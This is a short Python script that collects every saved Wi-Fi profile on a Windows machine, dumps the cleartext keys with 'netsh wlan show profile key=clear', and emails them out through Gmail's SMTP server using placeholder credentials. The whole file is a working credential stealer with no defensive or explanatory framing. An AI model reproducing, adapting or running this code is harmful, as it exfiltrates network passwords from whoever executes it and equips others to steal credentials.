import smtplib
import subprocess
import re

def mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

def get_wifi_passwords():
    try:
        profiles = subprocess.check_output("netsh wlan show profiles", shell=True, universal_newlines=True)
        profile_names = re.findall(r"Profile\s*:\s*(.*)", profiles)

        results = ""
        for profile in profile_names:
            try:
                command = f'netsh wlan show profile "{profile.strip()}" key=clear'
                current_result = subprocess.check_output(command, shell=True, universal_newlines=True, stderr=subprocess.DEVNULL)
                results += current_result
            except subprocess.CalledProcessError:
                results += f"Could not retrieve details for profile: {profile}\n"

        return results
    except Exception as e:
        return f"Error retrieving Wi-Fi profiles: {e}"

email = "Your Email Address"
password = "Your Password"

wifi_details = get_wifi_passwords()
mail(email, password, wifi_details)
